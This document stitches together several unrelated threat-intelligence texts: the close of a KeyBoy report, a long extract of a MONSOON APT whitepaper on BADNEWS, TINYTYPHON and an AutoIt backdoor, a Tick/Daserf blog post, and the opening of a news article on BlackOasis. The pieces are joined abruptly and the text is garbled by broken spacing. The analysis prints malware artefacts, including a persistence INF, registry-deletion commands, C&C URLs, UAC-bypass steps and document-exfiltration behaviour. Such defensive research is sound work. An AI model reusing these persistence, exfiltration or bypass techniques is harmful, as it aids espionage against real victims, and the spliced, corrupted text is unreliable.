9.\\nFigure 9 - C2 graphing\\nThere was some overlap with the samples and infrastructure, and one email address appears to jump out, which is linked to several domains: 657603405@qq[.]com. This email address does not appear to have been observed before.\\nOne other relevant point to note in regards to the infrastructure, is the use of dates, likely relating to campaign names, as part of the C2 servers. Examples include:\\nWeblogic727.xxuz[.]com (2017-07-27 campaign); and,\\nWeblogic1709.zzux[.]com (2017-09-17 campaign).\\nAll C2’s are provided in Appendix A.\\nConclusion\\nIn this report, we have analysed what we assess with high confidence, to be (part of) the latest KeyBoy campaign, a threat actor that has been active for several years, and displays at least a medium level of technical and operational know-how.\\nSeveral connections can be made to CitizenLab’s report from 2016, such as the continued usage of fake services and related DLLs, powerful capabilities, several exports and strings present in the (sometimes decrypted) DLLs, as well as campaign or version identifiers which are reminiscent and consistent with earlier reported identifiers.\\nWhile we do not have a clear visibility of targeting, it does appear that this latest campaign targets at least some Western organisations, likely for corporate espionage purposes. Organisations can refer to Appendix A, in order to search of any possible indicators of compromise. Additionally, organisations may wish to disable default administrator credentials, which will prevent unauthorised services to be installed.\\nFurther Information\\nClients who are part of our threat intelligence subscription services, can refer to our latest report CTO-TIB-20171019-01A - KeyBoy\\'s new toys, which includes more information as well as ruling in order to detect KeyBoy’s latest campaign.

Revision: 1 .0 7 | TLP - WHITE | 4 / 57 EXECUTIVE SUMMARY MONSOON is the name given to the Forcepoint Security investigation into an ongoing espionag e campaign that the Special Investigations team have been tracking and analysing since May 2016. The overarching campaign appears to target both Chinese nationals within different industries and government agencies in Southern Asia. It appears to have sta rted in December 2015 and is still ongoing as of July 2016. Amongst the e vidence gathered during th e MONSOON investigation were a number of indicators which make it highly probable 1 that this adversar y and the OPERATION HANGOVER [1] , [2] adve rsary are one and the same. These indicator include t he use of the same i nfrastructure for the attacks , similar Tactics, Techniques and Procedures (TTPs), the targeting of demographically similar victims and operati ng geographically within the Indian S ubcontinent . The malware components used in MONSOON are typically distributed through weaponised documents sent through e - mail to specifically chosen targets. Themes of these documents are usually political in nature an d taken from recent publications on topical current affairs. Several malware components have been used in this operation including Unknown Logger Public , TINYTYPHON , BADNEWS , and an AutoIt [3] backdoor. BADNEWS is particular ly interesting, containing resilient command - and - control (C&C) capability using RSS feeds, Github, forums, blogs and Dynamic DNS hosts . This whitepaper provides an in - depth understanding and insight into the actors and their campaign. It includes detail ed analysis and findings , previously undocumented malware components, victims, and infrastructure involved. ACKNOWLEDGEMENTS We would like to acknowledge both Kaspersky and Cymmetria [4] who have published their own research on the groups referred to as \"PATCH WORK\" and \"DROPPER ELEPHANT\". We also recognise the analysis by Blue Coat in tracking OPERATION HANGOVER in the past [1] . We would like to thank the wider Forcepoint Security Labs team for their help with our investigation. We would also like to give special thanks to Ran Mosessco for assisting with specific analysis. 1 - 32 h ttps://www.gov.uk/government/uploads/system/uploads/attachment_data/file/311572/20110830_jdp2_00_ed3_with_change1.pdf mation is always better than less.

Virus Total 2 (VT) Intelligence queries are often constructed in order to hunt for new, unusual and interesting malware as part of the routine work p erformed by the Special Investigations team. The initial discovery of MONSOON stemmed from one of these queries. During such activities, an RTF document was identified that warranted further investigation. Cyber Crime Bill. A specific document was si ngled - out for analysis via VT for number of reasons . These included: a l ow detection rate , a l ow number of submissions , an interesting set of default languages including US English, Saudi Arabic and PRC Chinese, that it e xploited a known vulnerability ( CV E - 2015 - 1641 [5] ) and that it had filename s with p olitical themes including Word - Telecommunications Policy - and \"Cyber_Crime_bill.doc\" 3 : This document was opened in a virtualised lab environment and was seen to drop malware. By analysing this malware is was possible to determine that it was not of a known or documented ma lware family. It contained interesting functionality that warranted further investigation ( see below) . T his malware was named b y Special Investigations as BADNEWS after its ability to use news sites and blogs to obtain its C&C address. Pivoting by Author. By exploiting the document information found in the original malicious RTF , the name of the user who last modified the docume nt was identified: 2 https://www.virustotal.com / 3 https://www.virustotal.com/en/file/34cdfc67942060ba30c1b9ac1db9bd042f0f8e487b805b8a3e1935b4d2508db6/analy s is/ PRELIM INARY (1) This Act may be called the Prevention of Electronic Crimes Act, 2015.

O ne of the samples used genuine content from the Na tional Institute for Defence Studies Japan document NIDS Ch ina Security Report 2016 4 . The specific filename used for this sample was \"china_report_EN_web_2016_A01.doc\" . Using Google to search for this specific filename returned three hits. Two of the results were for VT and another for a report on URLQuery.net. One of the VT results showed that the file was provided from a web server located on a host on IP address 37.58.60.195 and that it had also provided a number of other, similar files 5 . The other VT results referred to the analysis of the malicious file 6 .

The final Google search result was a report generated by the URLQuery.net site: Figure 7 URLQuery.net The site t.ymlp50[. com ] is a legitimate web and e - mail marketing service . It is owned and operated by the Belgian company Your Mailing List Provider (YML P). Further Google search es of other document names revealed similar redirection chains using the same service. Consequently, it is reasonable to conclude that a number of weaponised documents were delivered using YMLP. Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 10 / 57 E - MAIL LURES & MALWARE DISTRIBU TION Email Lures . Using the information from the initial discoveries and correlating against the data collected by Triton® AP - Email it was possible to track down at least some of the targeted e - mail lures used by the HANGOVER grou p in the MONSOON campaign. The e - mail themes are typically current political events that may be of interest to the target recipient . It was possible to identify sever al Chinese politically themed e - mails l i nking to weaponised documents. A redacted example e - mail can be seen below.

Figure 13 Lure Twitter Screen Shot Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 16 / 57 WEAPONISED DOCUMEN TS Exploitation of Known Vulnerabilities . Several document types and document exploits have been used in the MONSOON campaign to deliver various malware components. It is reasonable to suggest that the actors are using a malicious document builder to qui ckly weaponise legitimate documents. T he following vulnerabilities have been identified within the attackers\\' documents: Vulnerability Description CVE - 2012 - 0158 Microsoft BizTalk Server Windows Common Controls (MSCOMCTL.OCX) Bug Lets Remote Users Execute Arbitrary Code CVE - 2014 - 6352 Microsoft Windows CVE - 2014 - 6352 OLE Package Manager Remote Code Execution Vulnerability CVE - 2015 - 1641 Microsoft Office Memory Errors Let Remote Users Execute Arbitrary Code and Input Validation Flaw Permits Cross - Site Script ing Attacks Figure 14 Exploited CVEs Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 17 / 57 BADNEWS Weaponised Documents . The BADNEWS malware is typically packaged into a malicious document via an encrypted binary blob within th at document. This binary blob often contains a legit imate decoy doc ument that is shown to the user. On other occasions the decoy document is downloaded directly . CVE - 2015 - 1641 has been observed as being exploited to drop BADNEWS. When the document exploit is triggered, the shellcode will drop the binary bl ob into the user\\'s %temp% folder along with an encoded VBScript: Figure 15 Binary Blob Dropped to %temp% The encoded VBScript uses a file extension which is not associated, by default, as being a VBScript file. The extensions . domx and . lgx have been observed . The shellcode is responsible for adding a new file association for the file extension which specifies that they should be interpreted as an encoded VBScript. Finally, the shellcode executes the encoded VBScript file which will extract the encrypted files from the binary blob, show the decoy document (if there is one), and execute the malware. The VBScript hard - coded sizes of the files to extract from the binary blob: Figure 16 VB Extract of Blob Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 18 / 57 The decryption routine uses the encryption key \"ludos 7 to decrypt 32 - byte chunks of the embedded files: Figure 17 VB Decryption of Embedded Files Our analysis of BADNEWS can be found later in this document [Page: 22 ] 7 http://starw ars.wikia.com/wiki/Ludos Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 19 / 57 AutoIt Backdoor & Unknown Logger Weaponised Documents . The majority of weaponised documents drop an AutoIt backdoor . D ocument s exploiting CVE - 2014 - 6352 have been observed installing the malware via the following INF: [Version] Sig nature = \"$CHICAGO$\" class=61883 ClasGuid={2E87RBCD - 7488 - 12T1 - QYXX - 74521ACV1AS4} DriverVer=0/21/2006,61.7600.16385 [DestinationDirs] DefaultDestDir = 1 [DefaultInstall] AddReg = RxStart [RxStart] HKLM,Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ RunOnce,Inst all,,%1% \\\\ sysvolinfo.exe The malware executable name varies. The following are some of the names we have observed : sysvolinfo.exe svchost.exe rar.exe 360configuration_patch_update_2016v4.exe The AutoIt script is always roughly the same, but some versions contain less functionality. A full analysis of the AutoIt backdoor can be found later in this document [Page: 30 ] . M alware known as Unknown Logger has also been dropped by the same sort of weaponised document. A full analysis of Unknown Logger can also be found later in this document [Page: 37 ] . TINYTYPHON Weaponised Documents . A third malware used in MONSOON is a small backdoor based on publicly available code from the MyDoom [6] worm. This malware will crawl mapped drives for documents and upload them to its C&C. We have seen this dropped by an RTF exploiting CVE - 2012 - 0158 under the name \"DPP_INDIA_2016.doc\" 8 . The document contains shellcode which drops a file under %t emp% \\\\ svchost.exe and then attempts to disable Word\\'s recovery features via the following commands: cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 14.0 \\\\ Word \\\\ Resiliency\" /F cmd.exe /c reg delete \"HKCU \\\\ Software \\\\ Microsoft \\\\ Office \\\\ 12.0 \\\\ Word \\\\ Resiliency\" /F The svchost.exe 9 dropped by the document executes an embedded, base64 encoded malware component that we have named \" TINYTYPHON \". Our analysis of this malware can be found later in this document [Page: 41 ] . 8 http://starwars.wikia.com/wiki/Ludos 9 SHA1: 411387df2 145039fc601bf38192b721388cc5141 Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 20 / 57 POTENTIAL SILVERL IGHT EXPLOIT The weaponised document sites such as cnmilit[.com] and newsnstat[.com] will attempt to redirect the user to lite.php after 10 seconds: Figure 18 PHP Redirect It was not possible to access cnmilit[.com] as of May 2 7, 2016. It was therefore not possible to analyse the pages served. However, it was possible to browse to lite.php on newsnstat[. com ] . The content of this page always remained the same over the duration of the investigation. Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 21 / 57 Silverlight Profiling . Th e code profiles whether a system has Microsoft Silverlight installed. The site then requests lite.php?name= where the value of name is \\'true\\' or \\'false\\' depending on whether Silverlight is installed and accessible or not. No further content was served fro m lite.php during the investigation. A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document. This could have been intended as an exploitation of something like CVE - 2016 - 0034 which is known to have been adopted by exploit kits back in February 2016 and which pre - dates MONSOON.

The name was given due to its use o f RSS feeds, forums, blogs and D y na mic DNS providers for its C&C infrastructure. BADNEWS uses a DLL side - loading technique with a signed Java binary in order to evade security solutions. It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour. DLL Side - Loading . The BADNEWS DLL is typicall y side - loaded into a legitimate signed Java executable. A specific weaponised document analysed 10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll Mic roScMgmt.exe is a renamed version of the legitimate Java Runtime\\'s 6.0.390.4 binary named java - rmi.exe and is signed by Sun Microsystems. This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll . However, the jli.dll here contains the BADNEWS malware. When MicroScMgmt.exe is executed, it will load up the malicious jli.dll and ultimately call the JLI_WildcardExpandClasspath_0 export in the DLL. At this point the BADNEWS code will take over and begin performing its malicious routines. This technique is a stealth tactic to evade anti - malware solutions which are notoriously weak at detecting side - loaded malware. The malware will spawn 2 threads, one to perform key - logging and one to crawl the local hard - drives for document fil es. Persistence . BADNEWS installs a registry key under HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run in order to remain persistent on the system. Figure 20 Windows Registry Keys 10 SHA1: 11064dcef 86ac1d94c170b24215854efb8aad542 Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 23 / 57 C&C Channels . BADNEWS is ty pically built with several hard - coded channels which it can use to obtain commands or change its C&C. These C&C channels include RSS feeds, Github, forums, blogs and Dynamic DNS hosts. In the sample analysed, the malware had several hard - coded C&C channels although some were corrupted and did not work correctly: hxxp://feeds.rapidfeeds.com/81913/ hxxps://raw.githubusercontent.com/azeemkhan89/cartoon/master/cart.xml hxxp://www.webrss.com/createfeed.phpfeedid=47448 hxxp://www.webrss.com/createfeed.phpfeedid=4 7449 hxxp://www.chinasmack.com/2016/digest/chinese - tourist - bit - by - snake - in - thailand.html hxxp://www.travelhoneymoon.wordpress.com/2016/03/30/tips - to - how - to - feel - happy hxxp://overthemontains.weebly.com/trekking - lovers hxxp://tariqj.crabdance.com/tesla/ghsnl s.php hxxp://javedtar.chickenkiller.com/tesla/ghsnls.php hxxp://asatar.ignorelist.com/tesla/ghsnls.php The first 7 C&Cs are referred to by the malware as either a \"blog\" or a \"feed\". These channels are only used to tell the malware where its real C&C is. T he last 3 Dynamic DNS channels are back - up C&Cs in case it is not able to obtain a C&C address from one of the blogs or feeds. The Dynamic DNS back - up C&Cs typically use the same filename but the directory name changes for different builds of the malware. The directory may indicate a campaign identifier or a code - word for the target victim of the malware. We have seen the following directories used: tesla Tussmal Mussmal quantum yumhong Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 24 / 57 When a C&C is obtained from a blog or feed, it is extra cted from the page by searching for \"{{\" in the content. A GitHub example 11 is below: Figure 21 GitHub Command Channel A nother example taken from a comment by a user called \"Zubaid 12 \" posted on chinasmack [ .com ] : Figure 22 Chinasmack[.com] Command Channel 11 https://github .com/azeemkhan89/ 12 https://en.wikipedia.org/wiki/Zubaid Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 25 / 57 And a final example taken from forum.china.org.cn: Figure 23 F orum Command Channel The content after \"{{\" is the C&C address which is encrypted in the same manner as described below.

Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 26 / 57 C&C Mechanism . Once BADNEWS has decided which C&C address to communicate with it will send off some system informat ion and await a command to execute. A unique identifier is computed for the victim which is based on the tick count from the victim machine when the malware was executed. This ID is saved in the file \" %temp% \\\\ T89.dat \".

When BADNEWS first starts it will spawn a new thread to log keystrokes to a file. T he header of the file contains the marker \" KLTNM: \" and the system language. The rest of the file contains information about the active window and the keys pressed: KLTNM: 2016/06/01 09:42:18 - { Window Name } [SHIFT]c[SHIFT]; The malware will only send the keylog file to the C&C when instructed to by the \" kl \" command.

When BADNEWS first starts it will spawn a new thread to check all local & mapped drives for document files with the following extensions: doc docx pdf ppt pptx txt Any documents under 15MB will be copied to the user\\'s %temp% \\\\ SMB \\\\ folder. The malware will only send these documents to the C&C when instructed to by the \" ustr \" command. Window Message Processor . BADNEWS will also check for any new hard - drives that are added to the machine such as USB devices. It does this in an interesting way by creating a window and listening for the WM_DEVICECHANGE window message: LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) { // Window message 23 is defined by the malware as a code to disable the document crawler if ( Msg > WM_QUERYENDSESSION ) { if ( Msg == WM_ENDSESSION ) return 23; // Has a new device been added to the machine?

A fully decompiled version of this AutoIt backdoor was generated by the Special Investi Document Exfiltration . T he AutoIt backdoor is capable of finding and uploading documents with the following extensions: *.doc;*.pdf;*.csv;*.ppt;*.docx;*.pst;*.xls;*.xlsx;*.pptx;*.jpeg These will then be uploaded to / update - request.php on the C&C. Figure 27 Upload via PHP Script Privilege Escalation . The backdoor will attempt to escalate privileges by bypassing Windows User Account Control (UAC) using one of two well - known techniques 13 : If the user\\'s operating system is 64 - bit then the malware will use the Windows Update Standalone Installer (WUSA) to copy its DLL into a protected folder ( C: \\\\ Windows \\\\ System32 \\\\ oobe ) with the name wdscore.dll . It will then execute oobe.exe which will side - load the malicious wdscore.dll instead of the one from the system directory. If the user is on a 32 - bit system then the malware will use the CallWindowProcW API to jump into some shellcode that will inject the UAC bypass executable into Svchost.exe . Firs tly, the legitimate Windows \" Computer Management.lnk \" file is overwritten with a new version using Leo Davidson\\'s IFi leOperation 14 code. This links to the original malware executable. Secondly, the malware will execute CompMgmtLauncher.exe which in turn wil l execute the copied shortcut as an elevated process. 13 https://www.pretent iousname.com/misc/win7_uac_whitelist2.html 14 https://msdn.microsoft.com/en - us/library/bb775771(VS.85).aspx Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 32 / 57 PowerShell Second Stage & Metasploit Meterpreter .

UNKNOWN LOGGER PUBLIC V 1.5 Unknown Logger is another malware component used in MONSOON. It is a publicly released, free backdoor . It is capable of credential theft from browsers, keylogging, taking screenshots, spreading itself laterally, and downloading second stage malware. In 2012, a user named \"The Unknown\" publicly released a free version of a credential stealing worm on hackforums[. net ] called \"Unknown Logger Public\" . The actors have been using version 1.5 of this malware in some of their weaponised documents. It is likely that they simply downloaded and built their own version from the publicly available version 1.5 on Hackforums. Unkn own Logger is dropped by at least two 15 of the weaponised documents analysed. Both of these documents exploit CVE - 2014 - 6352 . 15 SHA1: 824013c9d8b2aab1396c4a50579f8bd4bf80abdb SHA1: e27d3cfc9141f618c5a8c075e7d18af11a012710 Figure 33 Unknown Logger Server Configuration Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 38 / 57 Figure 34 Unknown Logger Settings Panel Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 39 / 57 Unknown Logger\\'s main purpose is to record keystrokes and s teal usernames and passwords saved by browsers on the local machine. This information is then sent to a pre - defined FTP or SMTP server with a username and password specified by the actor when building the malware. It can also spread itself into RAR files, USB devices and network shares. Interestingly it does not have the ability for C&C communication. It cannot execute arbitrary commands or receive a command in dicating what it should do next.

The \" DownloadExecFileURL \" specifies a URL to grab an additional file from and execute it at runtime. A nalysis found that nregsrv2 . exe is the same AutoIt trojan dropped by many of the other weaponised documents used in this campaign. TINYTYPHON The TINYTYPHON malware is a small backdoor capable of finding and uploading documents on locally mapped drives and receiving secondary malware . It is dropped by at least one of the weaponised documents 17 used in the MONSOON campaign where it is embedded inside another executable. The majority of the code for TINYTYPHON is taken from the MyDoom worm and has been repurposed to find and exfiltrate documents. Configuration & Persistence . TINYTYPHON contains a small configuration appended to the end of the executable. In the sample analysed 18 this configuration was XORed with the hexadecimal value 0x90. 17 SHA1 : 9cdbb41f8 3854ea4827c83ad9809ed0210566fbc 18 SHA1: fcf8e5cf1 207fdfab9bcb0a4dc45ad188089655a Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 42 / 57 Fi gure 36 XOR 0x90 Data The configuration contains the C&C address and paths to use as well as a list of document extensions to check when crawling local drives. It also contains the filename to copy itself to in the local system32 directory, and the name of the persistence registry key to install itself under HKEY_LOCAL_MACHINE \\\\ Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run . Document Crawler . TINYTYPHON constantly searches for and uploads documents on the local machine. It will fir st search for any documents on the drive containing the operating system, and then it will search through all drive letters C through to Z.

Figure 38 Document Upload to C&C Victims . The TINYTYPHON C&C from the sample we analysed contained a / http directory which had an open directory listing: Figure 39 C&C Web Server /http listing Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 45 / 57 The / upload directory contain ed several folders relating to different victims: Figure 40 C &C Web Server /http/upload listing Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 46 / 57 Each of these folders contain ed the documents found and uploaded by TINYTYPHON on the victim\\'s machine. Figure 41 C &C Web Server /http/upload/<victim> listing The filenames begin with the MD5 hash of the file, then a dash, and then the original filename. There were thous ands of documents which had been exfiltrated to this C&C. After reviewing the filenames of documents from several of the victims, it appears as though most of the victims are involved with government agencies . Some of these documents contain highly sensiti ve information such as clearance documents, financial information, and technical specifications. During the investigation, the server stopped responding on June 8, 2016 and then came back online on July 5, 2016. It is unknown why this month long outage occ urred, although it could have been because the group knew that people were accessing the open directories and wanted to remain undetected . Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 47 / 57 ATTRIBUTION With respect to attribution, Forcepoint Security Labs focus on enabling the awareness and understanding o f intent. This is useful in order to identify likely future behaviour. Reports from Special Investigations do not focus on specific attribution. VICTIMS The MONSOON victims fit with a group who have military and political interests in the Indian Subcont inent . Many of the victims are located in surrounding countries including Bangladesh, Sri Lanka and Pakistan. But victims also originate from further afield, including Africa and the Far East. The targeting of Chinese nationals may also be related to this campaign , but equally may be part of a separate campaign by the adversary or even as part of them selling Surveillance - As - A - S ervice in a similar manner previously seen with the HANGOVER group [2] . A DVERSARIES It was possible to i dentify an individual from a domain registration record who is believed to be associated with MONSOON. There is a highly probable level of confidence in this association due to the following reasons: The domain name registered is a variant of one of the mo st popular domains used in MONSOON The person who registered the domain lives or has lived and works in India The person who registered the domain has profiles on coding challenge and freelance coder websites. The HANGOVER group are thought to use freelanc e coders. accounts. However, it is not deemed in the public interest to publish specific details on this individual. Relevant authorities are informed as an d when appropriate. Cui Bono? A useful analysis viewpoint is to ask the legal question: Cui Bono ? Or: w ho profits? Even though this report does not attempt to focus on specific attribution, asking hat is to be gained from these actions or what needs a may offers some insight. Any further analysis is left as an exercise to for reader. From the documents known to have been exfiltrated , a number of recurring themes occur : Army training, personnel and payroll records Defence attaches and co nsulates Defence research Foreign high commissions Military exercises Military air platforms Military naval platforms Military logistic records Naval coastal protection Anti - torpedo and naval electronic countermeasure (ECM) systems. Submarine communication systems Nuclear security and counter proliferation United Nations Personal details including medical records, d riving license, p assport and visas Accounting records Travel and itinerary details Fo rcepoint | Special Investigation s MONSOON ANALYSIS OF AN APT CA MPAIGN Revision: 1 .0 7 | TLP - WHITE | 48 / 57 INFRASTRUCTURE By integrating the findings with prior resear ch [1] [8] , i t was possible to connect MONSOON directly with infrastructure used by the HANGOVER group via a series of strong connections. The original HANGOVER infrastructure overlaps with unique pa ssive DNS records and is further linked by the use of a specific SOA RNAME record. An example of this connection is illustrated below. Figure 42 Connection Topology Both of the IPs that link this infrastructure appear to be un ique to the Hangover group. The newsnstat[. com ] domain was used earlier in 2015 for previous HANGOVER campaigns, and was then repurposed in December 2015 for the MONSOON campaign.

The group, known to Symantec as Tick, has maintained a low profile, appearing to be active for at least 10 years prior to discovery.\\nIn its most recent campaign, Tick employed spear-phishing emails and compromised a number of Japanese websites in order to infect a new wave of victims. The group is highly selective in its approach and only appears to deploy its full range of tools once it establishes that the compromised organization is an intended target. Tick also uses a range of hacktools to map the victim’s network and attempt to escalate privileges further.\\nDaserf’s main purpose is information stealing and the Trojan is capable of gathering information from infected computers and relaying it back to attacker-controlled servers. Tick’s most recent attacks have concentrated on the technology, aquatic engineering, and broadcasting sectors in Japan.\\nRecent attacks\\nSymantec discovered the most recent wave of Tick attacks in July 2015, when the group compromised three different Japanese websites with a Flash (.swf) exploit to mount watering hole attacks. Visitors to these websites were infected with a downloader known as Gofarer (Downloader.Gofarer). Gofarer collects information about the compromised computer\\xa0and then downloads and installs Daserf.\\nTick also used spear-phishing emails in these recent attacks. While Symantec did not find the emails themselves, it did identify the use of an exploit designed to take advantage of a vulnerability in Microsoft Office documents (CVE-2014-4114). This was used to distribute malware in addition to the watering hole activity.\\nTick under the microscope\\nDaserf appears to be custom-developed for use in Tick’s cyberespionage campaigns.\\xa0Once installed, it establishes a remote connection to Tick’s command and control server, providing the attacker with access to the compromised\\xa0computer.\\nFigure 1. Chain of infection seen in recent Japanese attacks\\nOnce the malware is installed on a targeted computer, the attackers attempt to enumerate the network and escalate their privilege level. To do this, Tick uses a number of publicly available hacktools such as Mimikatz, GSecdump, and Windows Credential Editor. The tools are downloaded and deployed to the original install directory previously created by the malware.\\nTick’s primary objective appears to be the theft of sensitive information from targeted Japanese organizations. To date, Symantec has observed the group attempting to steal emails and documents such as PowerPoint presentations.\\nLow-profile threat\\nThe Daserf Trojan employs a number of tactics to avoid detection. Once collected, the stolen data is hidden in password-protected .rar\\xa0archives.\\nDaserf also uses file and folder names related to legitimate programs often found in Windows environments in order to blend in. Observed folder names include HP, Intel, Adobe, and perflogs and folders are generally created in either the root drive or the Application Data or Program Files folders. File names used in recent attacks include adobe.exe, adobe_sl.exe, intel.exe, and intellog.exe.\\nCommand and control servers\\nTick uses compromised web servers to distribute malware and, in some instances, for its command and control (C&C) infrastructure. However, in most cases, it relies on its own infrastructure for C&C purposes.\\nIn its most recent campaigns, the group registered the domains used for C&C servers days after the malware was compiled. For example, one of the variants of Daserf used was compiled on July 8, 2015. This sample was seen contacting the C&C domain www[.]dreamsig[.]com, which was first registered on July 13, 2015,\\xa0five days after the compilation date. This pattern occurred in multiple Daserf samples.\\nAnother interesting aspect of the communication between the malware and the C&C infrastructure is how the malware changes the URL from a randomly chosen variable selected from a predefined list.\\nPredefined list from Daserf MD5: 765017E16842C9EB6860A7E9F711B0DB\\nrjdyw.asp\\nxszgj.asp\\ndheyf.asp\\nejdhf.asp\\ngxbne.asp\\nswetf.asp\\nqgfhr.asp\\nwhjdh.asp\\nzgfer.asp\\ncshyr.asp\\nfxkle.asp\\ntmwry.asp\\nviksr.asp\\nycghw.asp\\nTable 1.

Examples of Tick C&C domains and associated MD5 hashes\\nStolen digital certificates used in selected cases\\nThe majority of the malware analyzed was not digitally signed. However, a small percentage was signed with a stolen digital certificate. It is unclear why the certificate was used so sparingly, since signed malware would receive a greater level of trust and reduce the risk of detection.\\nIt is possible that the certificate was used against a target that had a secure environment which\\xa0may have required binaries to be signed in order to interact with the operating system.\\nThe issuer of the certificate has been informed of its misuse and confirmed that it would be revoked.\\nFigure 2. The stolen digital certificate used to sign Tick malware\\nTargets\\nThe use of compromised websites to infect victims results in unintentional infections, making it difficult to identify the motives of the attacker. By searching for evidence of post-infection activity, Symantec identified seven organizations where Tick had mounted persistent post-compromise attacks. These organizations were primarily large Japanese technology, engineering, and media firms.\\nFigure 3. Daserf infections by region\\nThe seven organizations therefore appear to be Tick’s intended targets. In addition to seeing post-compromise tools used in these attacks, the length of time the attackers were active on the networks provided additional evidence that these were high-value targets. The longest time Tick was active in a victim’s environment was 18 months. The average timeframe was five months and the number of infected hosts in a victim’s network ranged from 3 to 15 systems.\\nConclusion\\nTick has left a trail of evidence indicating that its activity began as early as 2006. In earlier attacks, the group used malicious Microsoft Word documents to infect victims, with compromised websites being added to the mix as a more recent attack vector.\\nTick appears to be a well-organized group, with the funding and capability to develop and update its malware. It has the ability to compromise legitimate infrastructure to use for malware distribution and has access to stolen digital certificates to sign its malware when needed. Tick primarily uses purchased infrastructure for its C&C servers and has been able to stay off the radar since 2006.\\nTick exhibits all the hallmarks of an advanced cyberespionage group. The long lifespan of the group, as well as the consistent targeted attacks against specific industries, support this theory. The individuals or organization behind Tick’s operations has an interest in Japanese technology along with Japanese media and broadcasting organizations. While Tick’s tactics may change over time, the group’s history indicates that its focus will continue to be a narrow range of targets, mainly in Japan.\\nProtection\\nSymantec and Norton products protect against these threats with the following detections:\\nAntivirus\\nBackdoor.Daserf\\nBackdoor.Daserf!gen1\\nBackdoor.Daserf.B\\nDownloader.Gofarer\\nDownloader.Gofarer!g1\\nDownloader.Gofarer!g2\\nDownloader.Gofarer!g3\\nIntrusion prevention system\\nSystem Infected: Backdoor.Daserf.B\\nStatistics\\n0\\nFavorited\\n1\\nViews\\n0\\nFiles\\n0\\nShares\\n0\\nDownloads\\nTags and Keywords\\nRelated Entries and Links\\nNo Related Resource entered.\\nProducts\\nApplications\\nSupport\\nCompany\\nHow To Buy\\nCopyright © 2005-2020 Broadcom.

The country\\'s National Cybersecurity Authority has warned of a new destructive malware variant (CC0 Creative Commons).\\nShare\\nWritten by\\nChris Bing\\nOct 16, 2017 | CyberScoop\\nWritten by\\nChris Bing\\nOct 16, 2017 | CYBERSCOOP\\nA well-funded, highly active group of Middle Eastern hackers was caught, yet again, using a lucrative zero-day exploit in the wild to break into computers and infect them with powerful spyware developed by an infamous cyberweapons dealer named Gamma Group.\\nThe incident, as described by security researchers with Moscow-based cybersecurity firm Kaspersky Lab, shines a rare light on the opaque although apparently vibrant market for software exploits and spyware,\\xa0which in this case appears to have been purchased by a nation-state.\\nThe Middle Eastern hacker group in this case is codenamed\\xa0“BlackOasis.” Kaspersky found the group was exploiting a Adobe Flash Player zero-day vulnerability\\xa0(CVE-2016-4117) to remotely deliver the latest version of “FinSpy” malware, according to a new blog post\\xa0published Monday. Adobe issued a fix Monday to its users in the form of a software update.\\nFinSpy, a final-stage payload that allows for an attacker to covertly learn what a target is talking about and who they are communicating with, is associated with Gamma Group\\xa0— which goes by other names, including\\xa0FinFisher and\\xa0Lench IT Solutions.\\nBlackOasis in recent months sent a wave of phishing emails. These emails contained malicious Microsoft Word documents with the aforementioned Flash Player zero-day hidden inside an embedded\\xa0ActiveX object. In the past, BlackOasis messages were designed to appear like news articles from 2016 about political relations between Angola and China.\\nThe term zero-day is indicative of a software flaw that remains unknown to the software’s creator. Zero-days can be highly disruptive because they provide a window of time for an attacker to breach victims before the vendor is able to apply a software update to address the specific security hole.\\nU.S. cybersecurity firm FireEye also recently captured\\xa0BlackOasis activity as part of a similar incident where the group relied on a different zero-day exploit — more specifically, a SOAP\\xa0WSDL\\xa0parser code injection vulnerability\\xa0— to install FinSpy onto a small number of devices. Again, the attacker’s 